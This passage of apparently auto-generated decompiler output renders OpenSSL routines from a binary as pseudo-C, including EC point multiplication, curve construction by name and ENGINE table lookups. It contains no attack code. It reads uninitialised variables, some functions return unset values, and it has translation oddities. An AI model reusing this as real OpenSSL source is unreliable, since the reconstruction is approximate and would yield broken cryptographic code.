                    int64_t v162 = v145 + 8; // 0x49a5dc
                    v31 = v160;
                    v29 = v144;
                    v27 = v155;
                    if (v73 <= v154) {
                        goto lab_0x49a766;
                    }
                    v145 = v162;
                    v146 = v160;
                    v147 = v154;
                    if (v147 < a4) {
                        // 0x49a518
                        v148 = a6;
                        v149 = BN_num_bits(*(int64_t *)(v145 + a6));
                    } else {
                        // 0x49a5eb
                        v148 = v161;
                        v149 = BN_num_bits(a3);
                    }
                    // 0x49a528
                    v150 = 0x100000000 * v149 / 0x100000000;
                    v151 = 6;
                    v152 = 32;
                    if (v150 < 2000) {
                        // 0x49a53b
                        v151 = 5;
                        v152 = 16;
                        if (v150 < 800) {
                            // 0x49a549
                            v151 = 4;
                            v152 = 8;
                            if (v150 < 300) {
                                // 0x49a557
                                v151 = 3;
                                v152 = 4;
                                if (v150 < 70) {
                                    // 0x49a563
                                    v153 = (int64_t)(v150 < 20) + 2;
                                    v151 = v153;
                                    v152 = v153;
                                }
                            }
                        }
                    }
                    // 0x49a578
                    v154 = v147 + 1;
                    *(int64_t *)(8 * v154 + v51) = 0;
                    *(int64_t *)(v145 + 0x100000000 * v54 / 0x100000000) = v151;
                    v155 = v148;
                    v156 = a3;
                    if (v147 < a4) {
                        // 0x49a5a3
                        v156 = *(int64_t *)(v145 + a6);
                        v155 = a6;
                    }
                    // 0x49a5ac
                    v157 = v145 + 0x100000000 * v55 / 0x100000000;
                    v158 = compute_wNAF(v156, v151, v157);
                    *(int64_t *)(v145 + v51) = v158;
                    result = 0;
                    v45 = v54;
                    v46 = v55;
                    v49 = v51;
                    v47 = v52;
                    v43 = v151;
                    v38 = 0;
                    v39 = 0;
                }
                goto lab_0x49a3ab_5;
            }
        }
    }
  lab_0x49a38e:
    // 0x49a38e
    ERR_put_error(16, 187, v42, "ec_mult.c", v40);
    result = 0;
    v45 = v54;
    v46 = v55;
    v49 = v51;
    v47 = v52;
    v43 = 187;
    v38 = 0;
    v39 = 0;
    goto lab_0x49a3ab_5;
  lab_0x49a6ba:
    // 0x49a6ba
    ERR_put_error(16, 187, v17, "ec_mult.c", v16);
    result = 0;
    v45 = 0;
    v46 = 0;
    v49 = 0;
    v47 = 0;
    v43 = 187;
    v38 = 0;
    v39 = 0;
    goto lab_0x49a3ab_5;
  lab_0x49a8a5:
    // 0x49a8a5
    v74 = CRYPTO_malloc((int64_t)(8 * v30 + 8), "ec_mult.c", 592, v36, v37);
    if (v74 == 0) {
        // 0x49abb9
        ERR_put_error(16, 187, 65, "ec_mult.c", 595);
        result = 0;
        v45 = v54;
        v46 = v55;
        v49 = v51;
        v47 = v52;
        v43 = 187;
        v38 = 0;
        v39 = 0;
        goto lab_0x49a3ab_5;
    } else {
        // 0x49a8cd
        v96 = v30;
        v75 = v74 + 8 * v96;
        *(int64_t *)v75 = 0;
        if (v73 == 0) {
            goto lab_0x49a997;
        } else {
            // 0x49a8f3
            *(int64_t *)v52 = v74;
            int64_t v163 = EC_POINT_new(a1); // 0x49a957
            *(int64_t *)v74 = v163;
            result = 0;
            v45 = v54;
            v46 = v55;
            v49 = v51;
            v47 = v52;
            v43 = (int64_t)"ec_mult.c";
            v38 = 0;
            v39 = v74;
            if (v163 != 0) {
                int64_t v164; // 0x49a160
                int64_t v165 = v164;
                int64_t v166; // 0x49a160
                int64_t v167 = v166;
                int64_t v168; // 0x49a160
                int64_t v169 = v168;
                int64_t * v170 = (int64_t *)v169;
                int64_t v171 = v167; // 0x49a160
                int64_t v172 = 0; // 0x49a160
                int64_t v173 = v172;
                int64_t v174 = v171;
                int64_t v175 = *v170; // 0x49a938
                int64_t v176 = v173 + 1; // 0x49a941
                int64_t v177 = v174 + 8; // 0x49a945
                int64_t v178 = 1 << (v175 + 63) % 64;
                int64_t v179; // 0x49a957
                while (v178 > v176) {
                    // 0x49a954
                    v179 = EC_POINT_new(a1);
                    *(int64_t *)v177 = v179;
                    result = 0;
                    v45 = v54;
                    v46 = v55;
                    v49 = v51;
                    v47 = v52;
                    v43 = v178;
                    v38 = 0;
                    v39 = v74;
                    v171 = v177;
                    v172 = v176;
                    if (v179 == 0) {
                        // break (via goto) -> 0x49a3ab
                        goto lab_0x49a3ab_5;
                    }
                    v173 = v172;
                    v174 = v171;
                    v175 = *v170;
                    v176 = v173 + 1;
                    v177 = v174 + 8;
                    v178 = 1 << (v175 + 63) % 64;
                }
                int64_t v180 = v165 + 1; // 0x49a974
                if (v73 <= v180) {
                    goto lab_0x49a997;
                }
                int64_t v181 = 8 * v180; // 0x49a91d
                *(int64_t *)(v181 + v52) = v177;
                int64_t v182 = EC_POINT_new(a1); // 0x49a957
                *(int64_t *)v177 = v182;
                result = 0;
                v45 = v54;
                v46 = v55;
                v49 = v51;
                v47 = v52;
                v43 = v178;
                v38 = 0;
                v39 = v74;
                int64_t v183; // 0x49a8fb
                v168 = v181 + v183;
                v166 = v177;
                v164 = v180;
                while (v182 != 0) {
                    // 0x49a938
                    v165 = v164;
                    v167 = v166;
                    v169 = v168;
                    v170 = (int64_t *)v169;
                    v171 = v167;
                    v172 = 0;
                    v173 = v172;
                    v174 = v171;
                    v175 = *v170;
                    v176 = v173 + 1;
                    v177 = v174 + 8;
                    v178 = 1 << (v175 + 63) % 64;
                    while (v178 > v176) {
                        // 0x49a954
                        v179 = EC_POINT_new(a1);
                        *(int64_t *)v177 = v179;
                        result = 0;
                        v45 = v54;
                        v46 = v55;
                        v49 = v51;
                        v47 = v52;
                        v43 = v178;
                        v38 = 0;
                        v39 = v74;
                        v171 = v177;
                        v172 = v176;
                        if (v179 == 0) {
                            // break (via goto) -> 0x49a3ab
                            goto lab_0x49a3ab_5;
                        }
                        v173 = v172;
                        v174 = v171;
                        v175 = *v170;
                        v176 = v173 + 1;
                        v177 = v174 + 8;
                        v178 = 1 << (v175 + 63) % 64;
                    }
                    // 0x49a974
                    v180 = v165 + 1;
                    if (v73 <= v180) {
                        goto lab_0x49a997;
                    }
                    // 0x49a913
                    v181 = 8 * v180;
                    *(int64_t *)(v181 + v52) = v177;
                    v182 = EC_POINT_new(a1);
                    *(int64_t *)v177 = v182;
                    result = 0;
                    v45 = v54;
                    v46 = v55;
                    v49 = v51;
                    v47 = v52;
                    v43 = v178;
                    v38 = 0;
                    v39 = v74;
                    v168 = v181 + v183;
                    v166 = v177;
                    v164 = v180;
                }
            }
            goto lab_0x49a3ab_5;
        }
    }
  lab_0x49aa35:;
    int64_t v184 = 8 * (int32_t)a4; // 0x49a83b
    int64_t v185 = v41;
    uint64_t v186 = v48;
    int64_t v187; // 0x49a160
    int64_t v188; // 0x49a160
    int64_t v189; // 0x49a160
    int64_t v190; // 0x49a160
    if (v186 > a4) {
        // 0x49aa49
        v141 = 0x100000000 * v53 / 0x100000000;
        int32_t v191 = v44;
        int64_t v192 = v184; // 0x49aaa9
        int64_t v193 = v184; // 0x49aaa9
        int64_t v194 = *(int64_t *)(v9 + 32); // 0x49aaa9
        int64_t v195 = v32; // 0x49aaa9
        int64_t v196 = 0x100000000 * v55 / 0x100000000 + v184; // 0x49aaa9
        int64_t v197 = a4; // 0x49aaa9
        int64_t v198 = v141; // 0x49aaa9
        while (true) {
            int64_t v199 = v198;
            int64_t v200 = v196;
            uint64_t v201 = v195;
            int64_t v202 = v194;
            int64_t v203 = v193;
            int64_t * v204; // 0x49a160
            int64_t v205; // 0x49a160
            if (v186 - 1 > v197) {
                int64_t * v206 = (int64_t *)v200;
                *v206 = v44;
                v42 = 68;
                v40 = 552;
                if (v44 > (int64_t)v50) {
                    // break -> 0x49a38e
                    break;
                }
                // 0x49aacf
                v50 -= v191;
                v205 = v44;
                v204 = v206;
            } else {
                int64_t v207 = v50; // 0x49ab6d
                int64_t * v208 = (int64_t *)v200;
                *v208 = v207;
                v205 = v207;
                v204 = v208;
            }
            int64_t * v209 = v204;
            v197++;
            *(int64_t *)(8 * v197 + v51) = 0;
            int64_t v210 = CRYPTO_malloc(v205, "ec_mult.c", 563, v192, v185); // 0x49aaff
            *(int64_t *)(v203 + v51) = v210;
            v139 = 566;
            v140 = 65;
            if (v210 == 0) {
                goto lab_0x49ac4a_2;
            }
            int64_t v211 = *v209; // 0x49ab16
            memcpy((int64_t *)v210, (int64_t *)v199, (int32_t)v211);
            v139 = 576;
            v140 = 68;
            if (*(int64_t *)v202 == 0) {
                goto lab_0x49ac4a_2;
            }
            uint64_t v212 = *v209; // 0x49ab29
            v195 = v201 < v212 ? v212 : v201;
            *(int64_t *)(v203 + v52) = v202;
            v187 = v141;
            v190 = v195;
            v188 = v51;
            v189 = v52;
            if (v186 <= v197) {
                goto lab_0x49ac0f;
            }
            // 0x49ab55
            v192 = v51;
            v193 = v203 + 8;
            v194 = v202 + 8 * v11;
            v196 = v200 + 8;
            v198 = v199 + v44;
        }
        goto lab_0x49a38e;
    } else {
        // 0x49aa35
        v187 = 0x100000000 * v53 / 0x100000000;
        v190 = v32;
        v188 = v184;
        v189 = v9;
      lab_0x49ac0f:
        // 0x49ac0f
        CRYPTO_free(v187, v189);
        v34 = v186;
        v35 = v190;
        v36 = v188;
        v37 = v185;
        goto lab_0x49a8a5;
    }
  lab_0x49af7d:;
    int64_t v213 = EC_POINT_set_to_infinity(a1, a1); // 0x49af83
    result = 0;
    v45 = v54;
    v46 = v55;
    v49 = v51;
    v47 = v52;
    v43 = a1;
    v38 = v76;
    v39 = v74;
    v98 = a1;
    if ((int32_t)v213 == 0) {
        goto lab_0x49a3ab_5;
    } else {
        goto lab_0x49af2d;
    }
  lab_0x49af2d:
    // 0x49af2d
    result = 1;
    v45 = v54;
    v46 = v55;
    v49 = v51;
    v47 = v52;
    v43 = v98;
    v38 = v76;
    v39 = v74;
    goto lab_0x49a3ab_5;
}

// Address range: 0x49aff0 - 0x49b4cb
int64_t EC_GROUP_new_by_curve_name(int64_t a1) {
    int32_t v1 = a1; // 0x49b019
    if (v1 < 1) {
        // 0x49b060
        return 0;
    }
    int64_t v2 = 0; // 0x49aff0
    int64_t v3; // 0x49b0a9
    int64_t v4; // 0x49b0b2
    switch (v1) {
        case 716: {
            // 0x49b092
            v2 = 32;
        }
        case 715: {
          lab_0x49b092:
            // 0x49b092
            v3 = *(int64_t *)((v2 | 8) + (int64_t)&g84);
            int64_t v5; // 0x49aff0
            int64_t v6; // 0x49aff0
            int64_t v7; // 0x49aff0
            v4 = BN_CTX_new(a1, v7, (int64_t)&g84, v2, v6, v5);
            if (v4 == 0) {
                // 0x49b22f
                ERR_put_error(16, 175, 65, "ec_curve.c", 245);
                EC_GROUP_free(0);
                // 0x49b039
                ERR_put_error(16, 174, 129, "ec_curve.c", 371);
                // 0x49b060
                return 0;
            }
            // break -> 0x49b0c3
            break;
        }
        case 415: {
            // 0x49b092
            v2 = 64;
            // branch (via goto) -> 0x49b092
            goto lab_0x49b092;
        }
        default: {
            // 0x49b039
            ERR_put_error(16, 174, 129, "ec_curve.c", 371);
            // 0x49b060
            return 0;
        }
    }
    int32_t v8 = *(int32_t *)(v3 + 4); // 0x49b0c3
    uint32_t v9 = *(int32_t *)(v3 + 8); // 0x49b0c7
    int64_t v10 = v8; // 0x49b0d4
    int64_t v11 = v3 + 16; // 0x49b0de
    int64_t v12 = v11 + v10; // 0x49b0de
    int64_t v13 = BN_bin2bn(v12, v9, 0); // 0x49b0eb
    int64_t v14 = 0; // 0x49b0f8
    int64_t v15; // 0x49aff0
    int64_t v16; // 0x49aff0
    int64_t v17; // 0x49aff0
    int64_t v18; // 0x49b10b
    int32_t v19; // 0x49b135
    if (v13 == 0) {
        goto lab_0x49b250;
    } else {
        // 0x49b0fe
        v18 = BN_bin2bn(v12 + (int64_t)v9, v9, 0);
        v14 = 0;
        if (v18 == 0) {
            goto lab_0x49b250;
        } else {
            int64_t v20 = BN_bin2bn(v12 + (int64_t)(2 * v9), v9, 0); // 0x49b12d
            v14 = v18;
            if (v20 == 0) {
                goto lab_0x49b250;
            } else {
                // 0x49b140
                v19 = v20;
                if (*(int64_t *)((v2 || 16) + (int64_t)&g84) == 0) {
                    // 0x49b288
                    v17 = 0;
                    if (*(int32_t *)v3 != 406) {
                        goto lab_0x49b2c0;
                    } else {
                        int64_t v21 = EC_GROUP_new_curve_GFp(v13, v18, 0x100000000 * v20 / 0x100000000, (int32_t)v4); // 0x49b2a3
                        v16 = 0;
                        v15 = 277;
                        v17 = v21;
                        if (v21 == 0) {
                            goto lab_0x49b184;
                        } else {
                            goto lab_0x49b2c0;
                        }
                    }
                } else {
                    int64_t v22 = EC_GROUP_new(v20); // 0x49b150
                    v16 = 0;
                    v15 = 269;
                    if (v22 == 0) {
                        goto lab_0x49b184;
                    } else {
                        // 0x49b15d
                        v16 = v22;
                        v15 = 269;
                        v17 = v22;
                        if ((int32_t)*(int64_t *)v22 != 0) {
                            goto lab_0x49b2c0;
                        } else {
                            goto lab_0x49b184;
                        }
                    }
                }
            }
        }
    }
  lab_0x49b250:
    // 0x49b250
    ERR_put_error(16, 175, 3, "ec_curve.c", 259);
    int32_t v23 = 0; // 0x49b27c
    int64_t v24 = 0; // 0x49b27c
    int64_t v25 = v14; // 0x49b27c
    goto lab_0x49b1cd;
  lab_0x49b1cd:
    // 0x49b1cd
    EC_GROUP_free(v24);
    BN_CTX_free(v4);
    int32_t v26 = v23; // 0x49b1d3
    int64_t v27 = 0; // 0x49b1d3
    int32_t v28 = 0; // 0x49b1d3
    int64_t v29 = 0; // 0x49b1d3
    int64_t v30 = 0; // 0x49b1d3
    int64_t v31 = v25; // 0x49b1d3
    int32_t v32 = v23; // 0x49b1d3
    int64_t v33 = 0; // 0x49b1d3
    int32_t v34 = 0; // 0x49b1d3
    int64_t result = 0; // 0x49b1d3
    int64_t v35 = 0; // 0x49b1d3
    int64_t v36 = v25; // 0x49b1d3
    if (v13 == 0) {
        goto lab_0x49b1df;
    } else {
        goto lab_0x49b1d5;
    }
  lab_0x49b1df:
    // 0x49b1df
    if (v36 != 0) {
        // 0x49b1e4
        BN_free(v36);
    }
    if (v32 != 0) {
        // 0x49b1f4
        BN_free((int64_t)v32);
    }
    if (v35 != 0) {
        // 0x49b203
        BN_free(v35);
    }
    if (v34 != 0) {
        // 0x49b213
        BN_free((int64_t)v34);
    }
    if (v33 != 0) {
        // 0x49b225
        BN_free(v33);
    }
    if (result == 0) {
        // 0x49b039
        ERR_put_error(16, 174, 129, "ec_curve.c", 371);
        // 0x49b060
        return 0;
    }
    // 0x49b238
    EC_GROUP_set_curve_name(result, a1 & 0xffffffff);
    // 0x49b060
    return result;
  lab_0x49b1d5:
    // 0x49b1d5
    BN_free(v13);
    v32 = v26;
    v33 = v27;
    v34 = v28;
    result = v29;
    v35 = v30;
    v36 = v31;
    goto lab_0x49b1df;
  lab_0x49b2c0:;
    int64_t v37 = EC_POINT_new(v17); // 0x49b2c3
    v16 = v17;
    v15 = 294;
    int64_t v38; // 0x49aff0
    int64_t v39; // 0x49aff0
    int64_t v40; // 0x49aff0
    int64_t v41; // 0x49aff0
    int64_t v42; // 0x49aff0
    int64_t v43; // 0x49aff0
    int64_t v44; // 0x49b2e7
    int64_t v45; // 0x49b313
    int64_t v46; // 0x49b40b
    if (v37 == 0) {
        goto lab_0x49b184;
    } else {
        int64_t v47 = v9; // 0x49b0c7
        v44 = BN_bin2bn(0x300000000 * v47 / 0x100000000 + v12, v9, 0);
        if (v44 == 0) {
            goto lab_0x49b3c5;
        } else {
            // 0x49b2fa
            v45 = BN_bin2bn(0x400000000 * v47 / 0x100000000 + v12, v9, 0);
            if (v45 == 0) {
                goto lab_0x49b3c5;
            } else {
                // 0x49b326
                if ((int32_t)EC_POINT_set_affine_coordinates_GFp(v17, v37) != 0) {
                    // 0x49b3f7
                    v46 = BN_bin2bn(v12 + (int64_t)(5 * v9), v9, 0);
                    if (v46 == 0) {
                        goto lab_0x49b42a;
                    } else {
                        int64_t v48 = 0x100000000 * v44 / 0x100000000; // 0x49b41c
                        if ((int32_t)BN_set_word(v48, (int64_t)*(int32_t *)(v3 + 12)) != 0) {
                            // 0x49b45b
                            v40 = 317;
                            if ((int32_t)EC_GROUP_set_generator(v17, v37, v46, v48) == 0) {
                                goto lab_0x49b4ab;
                            } else {
                                // 0x49b47a
                                v43 = v45;
                                v41 = v17;
                                v39 = v46;
                                if (v8 == 0) {
                                    goto lab_0x49b1cd_2;
                                } else {
                                    int64_t v49 = EC_GROUP_set_seed(v17, v11, v10); // 0x49b497
                                    v43 = v45;
                                    v41 = v17;
                                    v39 = v46;
                                    v40 = 324;
                                    if (v49 != 0) {
                                        goto lab_0x49b1cd_2;
                                    } else {
                                        goto lab_0x49b4ab;
                                    }
                                }
                            }
                        } else {
                            goto lab_0x49b42a;
                        }
                    }
                } else {
                    // 0x49b348
                    ERR_put_error(16, 175, 16, "ec_curve.c", 306);
                    v42 = v45;
                    v38 = 0;
                    goto lab_0x49b36c;
                }
            }
        }
    }
  lab_0x49b184:
    // 0x49b184
    ERR_put_error(16, 175, 16, "ec_curve.c", v15);
    v23 = v19;
    v24 = v16;
    v25 = v18;
    goto lab_0x49b1cd;
  lab_0x49b3c5:
    // 0x49b3c5
    ERR_put_error(16, 175, 3, "ec_curve.c", 301);
    v42 = 0;
    v38 = 0;
    goto lab_0x49b36c;
  lab_0x49b36c:
    // 0x49b36c
    EC_GROUP_free(v17);
    v43 = v42;
    v41 = 0;
    v39 = v38;
    goto lab_0x49b1cd_2;
  lab_0x49b1cd_2:
    // 0x49b1cd
    EC_POINT_free(v37);
    BN_CTX_free(v4);
    v26 = v19;
    v27 = v43;
    v28 = v44;
    v29 = v41;
    v30 = v39;
    v31 = v18;
    goto lab_0x49b1d5;
  lab_0x49b42a:
    // 0x49b42a
    ERR_put_error(16, 175, 3, "ec_curve.c", 312);
    v42 = v45;
    v38 = v46;
    goto lab_0x49b36c;
  lab_0x49b4ab:
    // 0x49b4ab
    ERR_put_error(16, 175, 16, "ec_curve.c", v40);
    v42 = v45;
    v38 = v46;
    goto lab_0x49b36c;
}

// Address range: 0x49e470 - 0x49e478
int64_t RSA_PKCS1_SSLeay(void) {
    // 0x49e470
    return (int64_t)&g205;
}

// Address range: 0x4a6a60 - 0x4a6a68
int64_t DH_OpenSSL(void) {
    // 0x4a6a60
    return (int64_t)&g206;
}

// Address range: 0x4a6ba0 - 0x4a6c0d
int64_t DH_generate_key(int64_t a1) {
    int64_t v1 = FIPS_mode(); // 0x4a6ba4
    int64_t v2 = *(int64_t *)(a1 + 128);
    if ((int32_t)v1 == 0 || (*(char *)(v2 + 49) & 4) != 0 || (*(char *)(a1 + 49) & 4) != 0) {
        // 0x4a6bd0
        return *(int64_t *)(v2 + 8);
    }
    // 0x4a6be8
    ERR_put_error(5, 115, 111, "dh_key.c", 83);
    return 0;
}

// Address range: 0x4a82e0 - 0x4a836d
int64_t ECDH_compute_key(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5) {
    int64_t v1 = ecdh_check(a4); // 0x4a830f
    if (v1 == 0) {
        // 0x4a8350
        return 0;
    }
    // 0x4a8319
    return *(int64_t *)(*(int64_t *)(v1 + 24) + 8);
}

// Address range: 0x4a9290 - 0x4a9355
int64_t engine_free_util(int64_t a1, int32_t a2) {
    if (a1 == 0) {
        // 0x4a9330
        ERR_put_error(38, 108, 67, "eng_lib.c", 112);
        return 0;
    }
    int64_t v1 = a1 + 172;
    int64_t v2; // 0x4a9290
    int64_t v3; // 0x4a9290
    int64_t v4; // 0x4a9290
    if (a2 != 0) {
        int64_t v5 = CRYPTO_add_lock(v1, 0xffffffff, 30, "eng_lib.c", 116); // 0x4a92de
        int32_t v6 = v5; // 0x4a92ea
        v2 = (int64_t)"eng_lib.c";
        v3 = v5 & 0xffffffff;
        v4 = 0xffffffff;
        if (v6 >= 0 == (v6 != 0)) {
            // 0x4a92b9
            return 1;
        }
    } else {
        int32_t * v7 = (int32_t *)v1; // 0x4a92a1
        uint32_t v8 = *v7 - 1; // 0x4a92ac
        *v7 = v8;
        v3 = v8;
        v4 = a2;
        if (v8 >= 1) {
            // 0x4a92b9
            return 1;
        }
    }
    // 0x4a92ee
    engine_pkey_meths_free(a1, v4, v3, v2);
    engine_pkey_asn1_meths_free(a1, v4, v3, v2);
    CRYPTO_free_ex_data(9, a1, a1 + 184);
    CRYPTO_free(a1, a1);
    return 1;
}

// Address range: 0x4a9360 - 0x4a936a
int64_t ENGINE_free(int64_t a1) {
    // 0x4a9360
    return engine_free_util(a1, 1);
}

// Address range: 0x4aa5f0 - 0x4aa611
int64_t engine_table_doall(int64_t a1, int64_t a2, int64_t * a3) {
    int64_t v1 = a2; // bp-24, 0x4aa5f4
    return lh_doall_arg(a1, 0x4aa5d0, &v1);
}

// Address range: 0x4aa690 - 0x4aa7e8
int64_t engine_table_select(int64_t * a1, int64_t a2) {
    // 0x4aa690
    if (a1 == NULL) {
        // 0x4aa73f
        return 0;
    }
    // 0x4aa6b5
    int64_t v1; // 0x4aa690
    ERR_set_mark((int64_t)a1, a2, v1);
    CRYPTO_lock(9, 30, "eng_table.c", 258, (int64_t)&g299, (int64_t)&g299);
    int64_t v2 = lh_retrieve(9); // 0x4aa6e8
    int64_t result = 0; // 0x4aa6f3
    int32_t * v3; // 0x4aa690
    int64_t * v4; // 0x4aa6f9
    if (v2 == 0) {
        goto lab_0x4aa71f;
    } else {
        // 0x4aa6f9
        v4 = (int64_t *)(v2 + 16);
        int64_t v5 = *v4; // 0x4aa6f9
        if (v5 == 0) {
            goto lab_0x4aa70b;
        } else {
            // 0x4aa702
            if ((int32_t)engine_unlocked_init(v5) != 0) {
                // 0x4aa702
                v3 = (int32_t *)(v2 + 24);
                goto lab_0x4aa714;
            } else {
                goto lab_0x4aa70b;
            }
        }
    }
  lab_0x4aa718:;
    // 0x4aa718
    int32_t * v6; // 0x4aa690
    *v6 = 1;
    goto lab_0x4aa71f;
  lab_0x4aa789:;
    // 0x4aa789
    int64_t v12; // 0x4aa690
    if ((int32_t)engine_unlocked_init(v12) != 0) {
        // break -> 0x4aa795
        goto lab_0x4aa795;
    }
    goto lab_0x4aa760;
  lab_0x4aa760:;
    // 0x4aa760
    int64_t v11; // 0x4aa690
    int64_t * v8; // 0x4aa762
    int64_t v16 = sk_value(*v8, v11); // 0x4aa769
    int64_t v10 = v16; // 0x4aa774
    v11 = v11 + 1 & 0xffffffff;
    if (v16 == 0) {
        goto lab_0x4aa718;
    }
    goto lab_0x4aa776;
  lab_0x4aa71f:
    // 0x4aa71f
    CRYPTO_lock(10, 30, "eng_table.c", 328, (int64_t)&g299, (int64_t)&g299);
    ERR_pop_to_mark();
    // 0x4aa73f
    return result;
  lab_0x4aa70b:;
    int32_t * v7 = (int32_t *)(v2 + 24);
    v3 = v7;
    if (*v7 == 0) {
        // 0x4aa762
        v8 = (int64_t *)(v2 + 8);
        int64_t v9 = sk_value(*v8, 0); // 0x4aa769
        v6 = v7;
        result = 0;
        v10 = v9;
        v11 = 1;
        if (v9 != 0) {
            while (true) {
              lab_0x4aa776:
                // 0x4aa776
                v12 = v10;
                int32_t v13 = *(int32_t *)(v12 + 176); // 0x4aa776
                if (v13 >= 0 == (v13 != 0)) {
                    goto lab_0x4aa789;
                } else {
                    // 0x4aa780
                    if (*(char *)&g282 % 2 != 0) {
                        goto lab_0x4aa760;
                    } else {
                        goto lab_0x4aa789;
                    }
                }
            }
          lab_0x4aa795:
            // 0x4aa795
            v6 = v7;
            result = v12;
            if (*v4 != v12) {
                int64_t v14 = engine_unlocked_init(v12); // 0x4aa7a5
                v6 = v7;
                result = v12;
                if ((int32_t)v14 != 0) {
                    int64_t v15 = *v4; // 0x4aa7ae
                    if (v15 != 0) {
                        // 0x4aa7b7
                        engine_unlocked_finish(v15, 0);
                    }
                    // 0x4aa7be
                    *v4 = v12;
                    v6 = v7;
                    result = v12;
                }
            }
        }
        goto lab_0x4aa718;
    } else {
        goto lab_0x4aa714;
    }
  lab_0x4aa714:
    // 0x4aa714
    v6 = v3;
    result = *v4;
    goto lab_0x4aa718;
}

// Address range: 0x4aac00 - 0x4aac05
int64_t ENGINE_get_ciphers(int64_t a1) {
    // 0x4aac00
    return *(int64_t *)(a1 + 72);
}

// Address range: 0x4aac20 - 0x4aac9a
int64_t ENGINE_get_cipher(int64_t a1, int32_t a2, int64_t a3) {
    int64_t v1 = ENGINE_get_ciphers(a1); // 0x4aac33
    if (v1 == 0 || (int32_t)v1 == 0) {
        // 0x4aac68
        ERR_put_error(38, 185, 146, "tb_cipher.c", 126);
        return 0;
    }
    // 0x4aac4f
    int64_t result; // 0x4aac20
    return result;
}

// Address range: 0x4aaca0 - 0x4aacae
int64_t ENGINE_get_cipher_engine(uint32_t a1) {
    // 0x4aaca0
    return engine_table_select(&g283, (int64_t)a1);
}

// Address range: 0x4aadc0 - 0x4aadc5
int64_t ENGINE_get_digests(int64_t a1) {
    // 0x4aadc0
    return *(int64_t *)(a1 + 80);
}

// Address range: 0x4aade0 - 0x4aae5a
int64_t ENGINE_get_digest(int64_t a1, int32_t a2, int64_t a3) {
    int64_t v1 = ENGINE_get_digests(a1); // 0x4aadf3
    if (v1 == 0 || (int32_t)v1 == 0) {
        // 0x4aae28
        ERR_put_error(38, 186, 147, "tb_digest.c", 126);
        return 0;
    }
    // 0x4aae0f
    int64_t result; // 0x4aade0
    return result;
}

// Address range: 0x4aae60 - 0x4aae6e
int64_t ENGINE_get_digest_engine(uint32_t a1) {
    // 0x4aae60
    return engine_table_select(&g284, (int64_t)a1);
}

// Address range: 0x4aaf80 - 0x4aaf85
int64_t ENGINE_get_pkey_meths(int64_t a1) {
    // 0x4aaf80
    return *(int64_t *)(a1 + 88);
}

// Address range: 0x4aafa0 - 0x4ab01f
int64_t engine_pkey_meths_free(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    int64_t result = *(int64_t *)(a1 + 88); // 0x4aafaf
    if (result == 0) {
        // 0x4ab012
        return 0;
    }
    // 0x4aafb8
    if ((int32_t)result < 1) {
        // 0x4ab012
        return result;
    }
    uint64_t v1 = result & 0xffffffff; // 0x4aafc3
    uint64_t v2 = 0;
    int64_t result2; // 0x4aafa0
    while (true) {
        // 0x4aafe4
        v2 = v2 + 1 & 0xffffffff;
        int32_t v3; // 0x4aafa0
        if (v3 == 0) {
            // 0x4aafd8
            result2 = 0;
            if (v1 <= v2) {
                // break -> 0x4ab012
                break;
            }
        } else {
            // 0x4aaffc
            int64_t v4; // 0x4aafa0
            result2 = EVP_PKEY_meth_free(v4);
            if (v1 <= v2) {
                // break -> 0x4ab012
                break;
            }
        }
    }
    // 0x4ab012
    return result2;
}

// Address range: 0x4ab020 - 0x4ab09a
int64_t ENGINE_get_pkey_meth(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = ENGINE_get_pkey_meths(a1); // 0x4ab033
    if (v1 == 0 || (int32_t)v1 == 0) {
        // 0x4ab068
        ERR_put_error(38, 192, 101, "tb_pkmeth.c", 127);
        return 0;
    }
    // 0x4ab04f
    int64_t result; // 0x4ab020
    return result;
}

// Address range: 0x4ab0a0 - 0x4ab0ae
int64_t ENGINE_get_pkey_meth_engine(int64_t a1) {
    // 0x4ab0a0
    return engine_table_select(&g285, a1 & 0xffffffff);
}

// Address range: 0x4ab1c0 - 0x4ab1c5
int64_t ENGINE_get_pkey_asn1_meths(int64_t a1) {
    // 0x4ab1c0
    return *(int64_t *)(a1 + 96);
}

// Address range: 0x4ab1e0 - 0x4ab26c
int64_t ENGINE_pkey_asn1_find_str(int64_t * a1, int64_t a2, int64_t a3) {
    int64_t v1 = 0; // bp-40, 0x4ab207
    CRYPTO_lock(9, 30, "tb_asnmth.c", 235, 0, 0);
    engine_table_doall(g286, 0x4ab360, &v1);
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)(v1 + 172); // 0x4ab23c
        *v2 = *v2 + 1;
    }
    // 0x4ab243
    *a1 = v1;
    CRYPTO_lock(10, 30, "tb_asnmth.c", 244, (int64_t)&g299, (int64_t)&g299);
    return 0;
}

// Address range: 0x4ab440 - 0x4ab4bf
int64_t engine_pkey_asn1_meths_free(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    int64_t result = *(int64_t *)(a1 + 96); // 0x4ab44f
    if (result == 0) {
        // 0x4ab4b2
        return 0;
    }
    // 0x4ab458
    if ((int32_t)result < 1) {
        // 0x4ab4b2
        return result;
    }
    uint64_t v1 = result & 0xffffffff; // 0x4ab463
    uint64_t v2 = 0;
    int64_t result2; // 0x4ab440
    while (true) {
        // 0x4ab484
        v2 = v2 + 1 & 0xffffffff;
        int32_t v3; // 0x4ab440
        if (v3 == 0) {
            // 0x4ab478
            result2 = 0;
            if (v1 <= v2) {
                // break -> 0x4ab4b2
                break;
            }
        } else {
            // 0x4ab49c
            int64_t v4; // 0x4ab440
            result2 = EVP_PKEY_asn1_free(v4);
            if (v1 <= v2) {
                // break -> 0x4ab4b2
                break;
            }
        }
    }
    // 0x4ab4b2
    return result2;
}

// Address range: 0x4ab4c0 - 0x4ab53a
int64_t ENGINE_get_pkey_asn1_meth(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = ENGINE_get_pkey_asn1_meths(a1); // 0x4ab4d3
    if (v1 == 0 || (int32_t)v1 == 0) {
        // 0x4ab508
        ERR_put_error(38, 193, 101, "tb_asnmth.c", 129);
        return 0;
    }
    // 0x4ab4ef
    int64_t result; // 0x4ab4c0
    return result;
}

// Address range: 0x4ab540 - 0x4ab54e
int64_t ENGINE_get_pkey_asn1_meth_engine(int64_t a1) {
    // 0x4ab540
    return engine_table_select(&g286, a1 & 0xffffffff);
}

// Address range: 0x4abff0 - 0x4ac00c
int64_t EVP_DecodeInit(int64_t * a1) {
    int64_t v1 = (int64_t)a1;
    *(int32_t *)(v1 + 4) = 30;
